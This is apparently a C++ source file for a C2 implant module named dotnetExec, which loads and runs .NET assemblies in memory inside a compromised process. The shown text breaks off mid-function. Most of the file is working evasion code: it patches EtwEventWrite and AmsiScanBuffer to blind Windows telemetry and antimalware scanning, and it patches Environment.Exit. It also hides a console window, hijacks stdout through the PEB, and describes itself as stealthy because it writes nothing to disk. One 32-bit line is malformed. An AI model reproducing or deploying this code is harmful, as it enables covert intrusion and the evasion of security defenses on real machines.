#include "DotnetExec.hpp"

#include <cstring>
#include <array>
#include <thread>


#ifdef _WIN32

#pragma comment(lib, "mscoree.lib")

using namespace mscorlib;

#endif


#include "Tools.hpp"
#include "Common.hpp"


using namespace std;


constexpr std::string_view moduleName = "dotnetExec";
constexpr unsigned long long moduleHash = djb2(moduleName);

#ifdef _WIN32

__declspec(dllexport) DotnetExec* DotnetExecConstructor() 
{
    return new DotnetExec();
}

#else

__attribute__((visibility("default"))) DotnetExec* DotnetExecConstructor() 
{
    return new DotnetExec();
}

#endif

DotnetExec::DotnetExec()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
#ifdef _WIN32
    m_firstRun=true;
    m_moduleLoaded=false;
    m_memEcrypted=false;

    m_pMetaHost = NULL;
    m_pRuntimeInfo=NULL;
    m_pClrRuntimeHost=NULL;
    m_pCustomHostControl=NULL;
    m_pCorHost=NULL;
    m_spAppDomainThunk=NULL;
    m_spDefaultAppDomain=NULL;
    m_targetAssembly=NULL;

    // need a console to catch output from dotnet when using non consol application
    // https://www.coresecurity.com/core-labs/articles/running-pes-inline-without-console
    if (GetConsoleWindow() == NULL)
    {
        AllocConsole();
        HWND conHandle = GetConsoleWindow();
        ShowWindow(conHandle, SW_HIDE);
    }

    // An interesting caveat that I found during the development of this tool was that while the redirection for PowerShell worked perfectly the first time, all subsequent calls failed.
    // This turned out to be because I was creating a new anonymous pipe on each run and closing it upon cleanup. PowerShell caches the first handle it uses for standard output and when it gets closed, the output redirection breaks down.
    // !!! we cannot reuse other pipe during all the life of this CLR -> unload / load new module will not work !
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    CreatePipe(&m_ioPipeRead, &m_ioPipeWrite, &sa, 0x100000);

#endif
}

DotnetExec::~DotnetExec()
{
#ifdef _WIN32
    clearAssembly();
    clearCLR();

    CloseHandle(m_ioPipeWrite);
    CloseHandle(m_ioPipeRead);
#endif
} 


int DotnetExec::clearCLR()
{
#ifdef _WIN32
    if(m_targetAssembly)
    {
        delete m_targetAssembly;
        m_targetAssembly = NULL;
    }
    if(m_spDefaultAppDomain)
    {
        m_spDefaultAppDomain->Release();
        m_spDefaultAppDomain = NULL;
    }
    if(m_spAppDomainThunk)
    {
        m_spAppDomainThunk->Release();
        m_spAppDomainThunk = NULL;
    }
    if(m_pCorHost)
    {
        m_pCorHost->Release();
        m_pCorHost = NULL;
    }
    if(m_pCustomHostControl)
    {
        delete m_pCustomHostControl;
        m_pCustomHostControl = NULL;
    }
    if (m_pClrRuntimeHost)
    {
        m_pClrRuntimeHost->Release();
        m_pClrRuntimeHost = NULL;
    }
    if(m_pRuntimeInfo)
    {
        m_pRuntimeInfo->Release();
        m_pRuntimeInfo = NULL;
    }
    if(m_pMetaHost)
    {
        m_pMetaHost->Release();
        m_pMetaHost = NULL;
    }
    m_firstRun=true;
#endif
    return 0;
}


int DotnetExec::clearAssembly()
{
#ifdef _WIN32
    m_moduleLoaded=false;
    m_memEcrypted=false;
#endif
    return 0;
}


std::string DotnetExec::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "DotnetExec Module:\n";
    info += "This module allows you to load and execute .NET assemblies (EXE or DLL) in memory.\n";
    info += "The execution occurred in the current process.\n";
    info += "Once an assembly is loaded, it can be reused using its assigned short name.\n\n";

    info += "Usage:\n";
    info += "  dotnetExec load <moduleShortName> <inputFile> <typeForDll>\n";
    info += "      - Load a .NET assembly (EXE or DLL) into memory.\n";
    info += "      - For DLLs, you must specify the fully-qualified type name (e.g., Namespace.ClassName).\n\n";

    info += "  dotnetExec runExe <moduleShortName> <arguments>\n";
    info += "      - Execute the loaded EXE assembly with optional command-line arguments.\n\n";

    info += "  dotnetExec runDll <moduleShortName> <methodName> <arguments>\n";
    info += "      - Invoke a specific method from the loaded DLL assembly.\n";
    info += "      - You must have specified the type when loading the DLL.\n\n";

    info += "Examples:\n";
    info += "  dotnetExec load mytool ./Tool.exe\n";
    info += "  dotnetExec runExe mytool \"--list --verbose\"\n\n";
    info += "  dotnetExec load libmodule ./Library.dll MyNamespace.MyClass\n";
    info += "  dotnetExec runDll libmodule Run \"param1 param2\"\n\n";

    info += "Notes:\n";
    info += "  - Assemblies remain in memory and can be re-used without reloading.\n";
    info += "  - Make sure the type and method names are correctly specified for DLLs.\n";
    info += "  - This module does not persist files to disk, making execution more stealthy.\n";
    info += "  - If you performe \"load\" in a process that already have the CLR loaded you could face \"Failed: DefaultAppDomain - Load_2\".\n";

#endif
    return info;
}


#define loadModule "00001"
#define runExe "00002"
#define runDll "00003"


#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS)

bool endsWithDLL(const std::string& str) 
{
    const std::string suffix = ".dll";
    if (str.size() >= suffix.size() && 
        str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0) {
        return true;
    }
    return false;
}


bool endsWithEXE(const std::string& str) 
{
    const std::string suffix = ".exe";
    if (str.size() >= suffix.size() && 
        str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0) {
        return true;
    }
    return false;
}

#endif


int DotnetExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 

    if((splitedCmd.size()==4 || splitedCmd.size()==5) && splitedCmd[1]=="load")
    {
        std::string name=splitedCmd[2];
        std::string inputFile=splitedCmd[3];
        std::string type="";

        if (endsWithDLL(inputFile) && splitedCmd.size()==5) 
        {
            type=splitedCmd[4];
        }
        else if (endsWithEXE(inputFile) && splitedCmd.size()==4) 
        {
            type="";
        }
        else
        {
            c2Message.set_returnvalue("For exe typeForDll need to be left empty.\nFor dll typeForDll need to specify the namespace and class: Exemple: PowerShellRunner.PowerShellRunner.");
            return -1;    
        }

        std::ifstream myfile;
        myfile.open(inputFile, std::ios::binary);

        if(!myfile)
        {
            std::string newInputFile=m_toolsDirectoryPath;
            newInputFile+=inputFile;
            myfile.open(newInputFile, std::ios::binary);
            inputFile=newInputFile;
        }

        if(!myfile) 
        {
            std::string msg = "Couldn't open file.\n";
            c2Message.set_returnvalue(msg);
            return -1;
        }

        c2Message.set_inputfile(inputFile);

        std::string fileContent(std::istreambuf_iterator<char>(myfile), {});

        c2Message.set_cmd(loadModule);
        c2Message.set_data(fileContent.data(), fileContent.size());
        c2Message.set_instruction(splitedCmd[0]);
        c2Message.set_args(name);
        c2Message.set_returnvalue(type);

        myfile.close();
    }
    else if(splitedCmd.size()>=3 && splitedCmd[1]=="runExe")
    {
        std::string name=splitedCmd[2];

        std::string argument;
        if(splitedCmd.size()>=4)
        {
            for(int i=3; i<splitedCmd.size(); i++)
            {
                argument += splitedCmd[i];
                argument += " ";
            }
        }

        c2Message.set_cmd(runExe);
        c2Message.set_args(argument);
        c2Message.set_data(name);
        c2Message.set_instruction(splitedCmd[0]);
    }
    else if(splitedCmd.size()>=4 && splitedCmd[1]=="runDll")
    {
        std::string name = splitedCmd[2]; 
        std::string methode = splitedCmd[3]; 
        std::string argument;
        if(splitedCmd.size()>=5)
        {
            for(int i=4; i<splitedCmd.size(); i++)
            {
                argument += splitedCmd[i];
                argument += " ";
            }
        }

        c2Message.set_cmd(runDll);
        c2Message.set_returnvalue(name);
        c2Message.set_data(methode);
        c2Message.set_args(argument);
        c2Message.set_instruction(splitedCmd[0]);
    }
    else
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }

#endif
    return 0;
}


#define ERROR_INIT_CLR_1 1 
#define ERROR_INIT_CLR_2 2
#define ERROR_INIT_CLR_3 3
#define ERROR_INIT_CLR_4 4
#define ERROR_INIT_CLR_5 5
#define ERROR_INIT_CLR_6 6
#define ERROR_INIT_CLR_7 7
#define ERROR_INIT_CLR_8 8

#define ERROR_LOAD_ASSEMLBY_1 11
#define ERROR_LOAD_ASSEMLBY_2 12
#define ERROR_LOAD_ASSEMLBY_3 13
#define ERROR_LOAD_ASSEMLBY_4 14
#define ERROR_LOAD_ASSEMLBY_5 15

#define ERROR_INVOKE_METHOD_1 21
#define ERROR_INVOKE_METHOD_2 22
#define ERROR_INVOKE_METHOD_3 23
#define ERROR_INVOKE_METHOD_4 24

#define ERROR_INVOKE_METHOD_11 31
#define ERROR_INVOKE_METHOD_12 32
#define ERROR_INVOKE_METHOD_13 33
#define ERROR_INVOKE_METHOD_14 34
#define ERROR_INVOKE_METHOD_15 35


int DotnetExec::process(C2Message &c2Message, C2Message &c2RetMessage)
{
#ifdef __linux__ 
#elif _WIN32

    string cmd = c2Message.cmd();

    int ret=0;
    if(m_firstRun)
    {
        ret = initCLR();
        if(ret!=0)
        {
            c2RetMessage.set_instruction(c2RetMessage.instruction());
            c2RetMessage.set_errorCode(ret);
            return -1;
        }
        
        m_firstRun=false;
    }

    if(cmd==loadModule)
    {        
        std::string name = c2Message.args();
        std::string type = c2Message.returnvalue();

        ret = loadAssembly(c2Message.data(), name, type);
        if(ret!=0)
        {
            c2RetMessage.set_instruction(c2RetMessage.instruction());
            c2RetMessage.set_errorCode(ret);
            return -1;
        }

        c2RetMessage.set_returnvalue("Success");
        m_moduleLoaded=true;
    }
    else if(cmd==runExe)
    {
        std::string argument = c2Message.args();
        std::string name = c2Message.data();

        std    ::string result;
        ret = invokeMethodExe(name, argument, result);
        if(ret!=0)
        {
            c2RetMessage.set_instruction(c2RetMessage.instruction());
            c2RetMessage.set_errorCode(ret);
            return -1;
        }

        c2RetMessage.set_instruction(c2RetMessage.instruction());
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
    }
    else if(cmd==runDll)
    {                
        std::string methode = c2Message.data();
        std::string argument = c2Message.args();
        std::string moduleType = c2Message.returnvalue();

        std    ::string result;
        ret = invokeMethodDll(moduleType, methode, argument, result);
        if(ret!=0)
        {
            c2RetMessage.set_instruction(c2RetMessage.instruction());
            c2RetMessage.set_errorCode(ret);
            return -1;
        }

        c2RetMessage.set_instruction(c2RetMessage.instruction());
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
    }

#endif

    return 0;
}


#ifdef _WIN32


#include <shlwapi.h>
#pragma comment(lib, "Shlwapi.lib")


typedef HRESULT(WINAPI *funcCLRCreateInstance)
(
    REFCLSID  clsid,
    REFIID     riid,
    LPVOID  * ppInterface
);


static const GUID xCLSID_ICLRRuntimeHost = { 0x90F1A06E, 0x7712, 0x4762, {0x86, 0xB5, 0x7A, 0x5E, 0xBA, 0x6B, 0xDB, 0x02} };


void* findStringInMemory(const char* target, void* startAddress, int lenght) 
{
    char* address = (char*)startAddress;
    size_t targetLength = std::strlen(target);

    for (size_t i = 0; i <= lenght - targetLength; ++i) 
    {
        if (std::memcmp(address + i, target, targetLength) == 0) 
        {
            return (void*)(address+i);
        }
    }
    return nullptr;
}


// https://www.coresecurity.com/core-labs/articles/running-pes-inline-without-console
// https://github.com/fortra/No-Consolation/blob/main/source/console.c
// https://kiewic.github.io/set-a-breakpoint-in-managed-code-cs-using-windbg
// https://github.com/EricEsquivel/Inline-EA/blob/9d36a278841180c7bbc8f360f2bf0797ea2ca39a/src/main.cpp#L194
// https://github.com/fortra/No-Consolation/blob/main/source/console.c
int DotnetExec::initCLR()
{
    // Patch EtwEventWrite
    bool isPatchEtw = true;
    if(isPatchEtw)
    {
        void * pEventWrite = (void*)GetProcAddress(GetModuleHandle("ntdll.dll"), "EtwEventWrite");
        
        HANDLE hProc=(HANDLE)-1;

        DWORD oldprotect = 0;
        // VirtualProtect(pEventWrite, 1024, PAGE_READWRITE, &oldprotect);

        HANDLE hProcess = GetCurrentProcess();
        SIZE_T dwSize = 1024;
        Sw3NtProtectVirtualMemory_(hProcess, &pEventWrite, &dwSize, PAGE_READWRITE, &oldprotect);

        #ifdef _WIN64
            // memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4);         // xor rax, rax; ret
            char patch[] = "\x48\x33\xc0\xc3"; // xor rax, rax; ret
            int patchSize = 4;
        #else
            // memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5);        // xor eax, eax; ret 14
            char patch[] patch = "\x33\xc0\xc2\x14\x00"; // xor rax, rax; ret
            int patchSize = 5;
        #endif
        
         WriteProcessMemory(hProc, pEventWrite, (PVOID)patch, patchSize, nullptr);

        // VirtualProtect(pEventWrite, 1024, oldprotect, &oldprotect);
        Sw3NtProtectVirtualMemory_(hProcess, &pEventWrite, &dwSize, oldprotect, &oldprotect);
    }

    // Patch AMSI
    HMODULE hAmsi = LoadLibrary("amsi.dll");
    std::string target = "AMSI";
    BYTE* baseAddress = (BYTE*)GetProcAddress(hAmsi, "AmsiScanBuffer");
    int lenght = 0x100;

    void* address = findStringInMemory(target.c_str(), (void*)baseAddress, lenght);
    if(address)
    {
        DWORD oldprotect = 0;
        VirtualProtect(address, 1024, PAGE_READWRITE, &oldprotect);

        std::string patch = "ASMI";
        memcpy( (void*)(address), (void*)(patch.c_str()), patch.size());

        VirtualProtect(address, 1024, oldprotect, &oldprotect);
    }
    else
    {
    }

    HMODULE hMscoree = LoadLibrary("mscoree.dll");

    //
    // Load CLR
    //
    funcCLRCreateInstance pCLRCreateInstance = NULL;
    pCLRCreateInstance = (funcCLRCreateInstance)GetProcAddress(hMscoree, "CLRCreateInstance");

    HRESULT hr = pCLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&m_pMetaHost));
    if (FAILED(hr))
        return ERROR_INIT_CLR_1;

    hr = m_pMetaHost->GetRuntime(L"v4.0.30319", IID_PPV_ARGS(&m_pRuntimeInfo));
    if (FAILED(hr))
        return ERROR_INIT_CLR_2;

    BOOL loadable;
    hr = m_pRuntimeInfo->IsLoadable(&loadable);
    if (FAILED(hr))
        return ERROR_INIT_CLR_3;

    hr = m_pRuntimeInfo->GetInterface(xCLSID_ICLRRuntimeHost, IID_PPV_ARGS(&m_pClrRuntimeHost));
    if (FAILED(hr))
        return ERROR_INIT_CLR_4;
    
    m_pCustomHostControl = new MyHostControl();
    m_pClrRuntimeHost->SetHostControl(m_pCustomHostControl);

    // start the CLR
    hr = m_pClrRuntimeHost->Start();
    if (FAILED(hr))
        return ERROR_INIT_CLR_5;

    // Now we get the ICorRuntimeHost interface so we can use the normal (deprecated) assembly load API calls
    hr = m_pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&m_pCorHost);
    if (FAILED(hr))
        return ERROR_INIT_CLR_6;

    // Get a pointer to the default AppDomain in the CLR.
    hr = m_pCorHost->GetDefaultDomain(&m_spAppDomainThunk);
    if (FAILED(hr))
        return ERROR_INIT_CLR_7;

    hr = m_spAppDomainThunk->QueryInterface(IID_PPV_ARGS(&m_spDefaultAppDomain));
    if (FAILED(hr))
        return ERROR_INIT_CLR_8;

    m_targetAssembly = new TargetAssembly();
    m_pCustomHostControl->setTargetAssembly(m_targetAssembly);


    //
    // patch exit - // https://www.outflank.nl/blog/2024/02/01/unmanaged-dotnet-patching/
    //
    _Assembly* mscorlib;
    m_spDefaultAppDomain->Load_2(SysAllocString(L"mscorlib, Version=4.0.0.0"), &mscorlib);

    _Type* exitClass;
    mscorlib->GetType_2(SysAllocString(L"System.Environment"), &exitClass);

    _MethodInfo* exitInfo;
    BindingFlags exitFlags = (BindingFlags)(BindingFlags_Public | BindingFlags_Static);
    exitClass->GetMethod_2(SysAllocString(L"Exit"), exitFlags, &exitInfo);

    _Type* methodInfoClass;
    mscorlib->GetType_2(SysAllocString(L"System.Reflection.MethodInfo"), &methodInfoClass);

    _PropertyInfo* methodHandleProperty;
    BindingFlags methodHandleFlags = (BindingFlags)(BindingFlags_Instance | BindingFlags_Public);
    methodInfoClass->GetProperty(SysAllocString(L"MethodHandle"), methodHandleFlags, &methodHandleProperty);

    VARIANT methodHandlePtr = {0};
    methodHandlePtr.vt = VT_UNKNOWN;
    methodHandlePtr.punkVal = exitInfo;

    SAFEARRAY* methodHandleArgs = SafeArrayCreateVector(VT_EMPTY, 0, 0);
    VARIANT methodHandleValue = {0};
    methodHandleProperty->GetValue(methodHandlePtr, methodHandleArgs, &methodHandleValue);

    _Type* rtMethodHandleType;
    mscorlib->GetType_2(SysAllocString(L"System.RuntimeMethodHandle"), &rtMethodHandleType);

    _MethodInfo* getFuncPtrMethodInfo;
    BindingFlags getFuncPtrFlags = (BindingFlags)(BindingFlags_Public | BindingFlags_Instance);
    rtMethodHandleType->GetMethod_2(SysAllocString(L"GetFunctionPointer"), getFuncPtrFlags, &getFuncPtrMethodInfo);

    SAFEARRAY* getFuncPtrArgs = SafeArrayCreateVector(VT_EMPTY, 0, 0);
    VARIANT exitPtr = {0};
    getFuncPtrMethodInfo->Invoke_3(methodHandleValue, getFuncPtrArgs, &exitPtr);

    DWORD oldProt = 0;
    BYTE patch = 0xC3;

    VirtualProtect(exitPtr.byref, 1, PAGE_READWRITE, &oldProt);
    memcpy(exitPtr.byref, &patch, 1);
    VirtualProtect(exitPtr.byref, 1, oldProt, &oldProt); 


    // valious tests !!!!
    // // Console
    // _Type* consoleClass;
    // mscorlib->GetType_2(SysAllocString(L"System.Console"), &consoleClass);

    // SAFEARRAY* methodsArray;
    // hr = consoleClass->GetMethods((BindingFlags)(BindingFlags_Public | BindingFlags_Static), &methodsArray);

    // LONG lowerBound, upperBound;
    // SafeArrayGetLBound(methodsArray, 1, &lowerBound);
    // SafeArrayGetUBound(methodsArray, 1, &upperBound);

    // for (LONG i = lowerBound; i <= upperBound; ++i) 
    // {
    //     mscorlib::_MethodInfo* methodInfo;
    //     SafeArrayGetElement(methodsArray, &i, &methodInfo);

    //     // std::cout << "methodInfo: " << methodInfo << std::endl;

    //     _Type* methodInfoClass;
    //     mscorlib->GetType_2(SysAllocString(L"System.Reflection.MethodInfo"), &methodInfoClass);

    //     _PropertyInfo* NameProperty;
    //     BindingFlags methodHandleFlags = (BindingFlags)(BindingFlags_Instance | BindingFlags_Public);
    //     methodInfoClass->GetProperty(SysAllocString(L"Name"), methodHandleFlags, &NameProperty);

    //     VARIANT methodHandlePtr = {0};
    //     methodHandlePtr.vt = VT_UNKNOWN;
    //     methodHandlePtr.punkVal = methodInfo;

    //     SAFEARRAY* methodHandleArgs = SafeArrayCreateVector(VT_EMPTY, 0, 0);
    //     VARIANT var = {0};
    //     NameProperty->GetValue(methodHandlePtr, methodHandleArgs, &var);

       //     BSTR bstrWriteString = SysAllocString( L"Write");
    //     if (var.vt != VT_BSTR)
    //         continue;

    //     std::wcout << L"VARIANT " << var.bstrVal << std::endl;
    //     // if (var.bstrVal != bstrWriteString)
    //     //     continue;



    //     // _MethodInfo* test;
    //     // methodInfoClass->GetMethod_2(SysAllocString(L"GetParameters"), methodHandleFlags, &test);
    //     // // methodHandleProperty->GetValue(methodHandlePtr, methodHandleArgs, &var);

    //     // std::cout << "test: " << test << std::endl;

    //     // VARIANT obj;    
    //     // VariantInit(&obj);  // Initialize the VARIANT structure
    //     // obj.vt = VT_NULL;   // Set the type to VT_NULL
    //     // obj.plVal = NULL;   // Set the pointer to NULL

    //     // SAFEARRAY* getFuncPtrArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);  // Create an empty SAFEARRAY of VARIANTs

    //     // VARIANT retVal;
    //     // VariantInit(&retVal);  // Initialize the VARIANT structure

    //     // hr = test->Invoke_3(obj, getFuncPtrArgs, &retVal);

    //     //         if (FAILED(hr)) {
    //     //     std::cerr << "Method invocation failed with HRESULT: " << hr << std::endl;
    //     // } else if (retVal.vt == VT_EMPTY) {
    //     //     std::cout << "Method returned no value." << std::endl;
    //     // } else {
    //     //     // Process retVal as needed
    //     // }
        


    //     methodHandleArgs = SafeArrayCreateVector(VT_EMPTY, 0, 0);
    //     VARIANT methodHandleValue = {0};
    //     methodHandleProperty->GetValue(methodHandlePtr, methodHandleArgs, &methodHandleValue);


    //     // resolve and execute GetFunctionPointer
    //     _Type* rtMethodHandleType;
    //     mscorlib->GetType_2(SysAllocString(L"System.RuntimeMethodHandle"), &rtMethodHandleType);

    //     _MethodInfo* getFuncPtrMethodInfo;
    //     BindingFlags getFuncPtrFlags = (BindingFlags)(BindingFlags_Public | BindingFlags_Instance);
    //     rtMethodHandleType->GetMethod_2(SysAllocString(L"GetFunctionPointer"), getFuncPtrFlags, &getFuncPtrMethodInfo);

    //     SAFEARRAY* getFuncPtrArgs = SafeArrayCreateVector(VT_EMPTY, 0, 0);
    //     VARIANT Ptr = {0};
    //     getFuncPtrMethodInfo->Invoke_3(methodHandleValue, getFuncPtrArgs, &Ptr);

    //     printf("[U] function pointer: 0x%p\n", Ptr.byref);

    // }

    // SafeArrayDestroy(methodsArray);

    return 0;
}


typedef HRESULT(__stdcall* CLRIdentityManagerProc)(REFIID, IUnknown**);


int DotnetExec::loadAssembly(const std::string& data, const std::string& name, const std::string& type)
{
    if(1)
    {
        CLRIdentityManagerProc pIdentityManagerProc = NULL;
        m_pRuntimeInfo->GetProcAddress("GetCLRIdentityManager", (void**)&pIdentityManagerProc);

        ICLRAssemblyIdentityManager* pIdentityManager;
        HRESULT hr = pIdentityManagerProc(IID_ICLRAssemblyIdentityManager, (IUnknown**)&pIdentityManager);
        if (FAILED(hr))
            return ERROR_LOAD_ASSEMLBY_1;
        
        m_pCustomHostControl->updateTargetAssembly(pIdentityManager, data);
        LPWSTR identityBuffer = m_pCustomHostControl->getAssemblyInfo();

        // std::wcout << "identityBuffer Load_2 " << identityBuffer << std::endl;

        // With the modification done to the host control, we can now load the assembly with load2 as if it was on the dik
        BSTR assemblyName = SysAllocString(identityBuffer);
        mscorlib::_AssemblyPtr spAssembly;
         hr = m_spDefaultAppDomain->Load_2(assemblyName, &spAssembly);
        if (FAILED(hr))
        {
            // std::cerr << "Load_2 failed: " << std::hex << hr << std::endl;
            // _com_error err(hr);
            // std::wcerr << L"Error message: " << err.ErrorMessage() << std::endl;
            SysFreeString(assemblyName);
            return ERROR_LOAD_ASSEMLBY_3;
        }
        SysFreeString(assemblyName);
        pIdentityManager->Release();

        AssemblyModule assemblyModule;
        assemblyModule.spAssembly = spAssembly;
        assemblyModule.name = name;
        assemblyModule.type = type;
        m_assemblies.push_back(assemblyModule);
    }
    else
    {
        // (Option 2) Load the assembly from memory
        SAFEARRAYBOUND rgsabound[1];
        rgsabound[0].cElements = data.size();
        rgsabound[0].lLbound = 0;
        SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);
        void* pvData = NULL;
        HRESULT hr = SafeArrayAccessData(pSafeArray, &pvData);
        memcpy(pvData, data.data(), data.size());
        hr = SafeArrayUnaccessData(pSafeArray);
        mscorlib::_AssemblyPtr spAssembly;
        hr = m_spDefaultAppDomain->Load_3(pSafeArray, &spAssembly);
        if (FAILED(hr))
        {
            // std::cerr << "Load_3 failed: " << std::hex << hr << std::endl;
            // _com_error err(hr);
            // std::wcerr << L"Error message: " << err.ErrorMessage() << std::endl;
            SafeArrayDestroy(pSafeArray);
            return ERROR_LOAD_ASSEMLBY_4;
        }
        SafeArrayDestroy(pSafeArray);

        AssemblyModule assemblyModule;
        assemblyModule.spAssembly = spAssembly;
        assemblyModule.name = name;
        assemblyModule.type = type;
        m_assemblies.push_back(assemblyModule);
    }

    // encryptMem();

    return 0;
}


int DotnetExec::encryptMem()
{
    if(m_memEcrypted)
        return 0;
    else
    {
        std::string toto = "sdfsdgdfhgfk,jhgkfdssqSQSFD";
        m_pCustomHostControl->xorMemory(toto);
        m_memEcrypted=true;
    }
    return 0;
}


int DotnetExec::decryptMem()
{
    if(!m_memEcrypted)
        return 0;
    else
    {
        std::string toto = "sdfsdgdfhgfk,jhgkfdssqSQSFD";
        m_pCustomHostControl->xorMemory(toto);
        m_memEcrypted=false;
    }
    return 0;
}

#define RTL_MAX_DRIVE_LETTERS 32

typedef UNICODE_STRING* PUNICODE_STRING;

typedef struct _RTL_DRIVE_LETTER_CURDIR {
    USHORT                  Flags;
    USHORT                  Length;
    ULONG                   TimeStamp;
    UNICODE_STRING          DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;


typedef struct _CURDIR
{
    UNICODE_STRING DosPath;
    HANDLE Handle;
} CURDIR, * PCURDIR;


typedef struct _RTL_USER_PROCESS_PARAMETERS_CUSTOM
 {
    ULONG MaximumLength;
    ULONG Length;

    ULONG Flags;
    ULONG DebugFlags;

    HANDLE ConsoleHandle;
    ULONG ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;

    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;

    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;

    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

    ULONG EnvironmentSize;
    ULONG EnvironmentVersion;
    PVOID PackageDependencyData; //8+
    ULONG ProcessGroupId;
    // ULONG LoaderThreads;
} RTL_USER_PROCESS_PARAMETERS_CUSTOM, *PRTL_USER_PROCESS_PARAMETERS_CUSTOM;

struct PEB_LDR_DATA_CUSTOM
{
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
};

struct PEB_CUSTOM
{
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN SpareBits : 1;
        };
    };
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PEB_LDR_DATA_CUSTOM* Ldr;
    PRTL_USER_PROCESS_PARAMETERS_CUSTOM ProcessParameters;
    //...
};


// don't load AMSI
int DotnetExec::invokeMethodExe(const std::string name, const std::string& argument, std::string& result)
{
    bool assemblyFound = false;
    mscorlib::_AssemblyPtr spAssembly=nullptr;
    for(int i=0; i<m_assemblies.size(); i++)
    {
        if(m_assemblies[i].name==name)
        {
            assemblyFound = true;
            spAssembly = m_assemblies[i].spAssembly;
            break;
        }
    }

    if(!assemblyFound)
    {
        return ERROR_LOAD_ASSEMLBY_5;
    }

    if(spAssembly==nullptr)
        return ERROR_INVOKE_METHOD_11;

    // decryptMem();
    mscorlib::_MethodInfoPtr pMethodInfo;
    HRESULT hr = spAssembly->get_EntryPoint(&pMethodInfo);
    if (FAILED(hr) || pMethodInfo == NULL)
        return ERROR_INVOKE_METHOD_12;

    SAFEARRAY* sav = SafeArrayCreateVector(VT_VARIANT, 0, 1);
    VARIANT vtPsa;

    LONG i;
    if(!argument.empty()) 
    {
        wstring wCommand(argument.begin(), argument.end());
        WCHAR **argv;
        int argc;
        argv = CommandLineToArgvW(wCommand.data(), &argc);
        
        vtPsa.vt = (VT_ARRAY | VT_BSTR);
        vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, argc);

        // add each string parameter
        for(i=0; i<argc; i++) 
        {  
            SafeArrayPutElement(vtPsa.parray, &i, SysAllocString(argv[i]));
        }
    } 
    else 
    {
        vtPsa.vt = (VT_ARRAY | VT_BSTR);
        vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, 1);
        
        i=0;
        SafeArrayPutElement(vtPsa.parray, &i, SysAllocString(L""));
    }
    i=0;
    SafeArrayPutElement(sav, &i, &vtPsa);

    
    // methode direct
#ifdef _M_IX86 
    PEB_CUSTOM * ProcEnvBlk = (PEB_CUSTOM *) __readfsdword(0x30);
#else
    PEB_CUSTOM * ProcEnvBlk = (PEB_CUSTOM *)__readgsqword(0x60);
#endif
    PRTL_USER_PROCESS_PARAMETERS_CUSTOM processParameters = ProcEnvBlk->ProcessParameters;
    HANDLE consoleHandle = processParameters->StandardOutput;
    processParameters->StandardOutput = m_ioPipeWrite;

    // HANDLE consoleHandle = GetStdHandle(STD_OUTPUT_HANDLE);
    // SetStdHandle(STD_OUTPUT_HANDLE, m_ioPipeWrite);

    VARIANT retVal;
    ZeroMemory(&retVal, sizeof(VARIANT));
    VARIANT obj;
    ZeroMemory(&obj, sizeof(VARIANT));
    obj.vt    = VT_NULL;
    obj.plVal = NULL;

    try
    {
        hr = pMethodInfo->Invoke_3(obj, sav, &retVal);

        SafeArrayDestroy(sav);
        VariantClear(&vtPsa);
        VariantClear(&retVal);
        VariantClear(&obj);
        pMethodInfo->Release();

        if (FAILED(hr))
        {
            processParameters->StandardOutput = consoleHandle;
            return ERROR_INVOKE_METHOD_13;
        }
    }
    catch (_com_error &e)
    {
        SafeArrayDestroy(sav);
        VariantClear(&vtPsa);
        VariantClear(&retVal);
        VariantClear(&obj);
        pMethodInfo->Release();

        processParameters->StandardOutput = consoleHandle;
        return ERROR_INVOKE_METHOD_14;
    }
    catch (...)
    {
        SafeArrayDestroy(sav);
        VariantClear(&vtPsa);
        VariantClear(&retVal);
        VariantClear(&obj);
        pMethodInfo->Release();

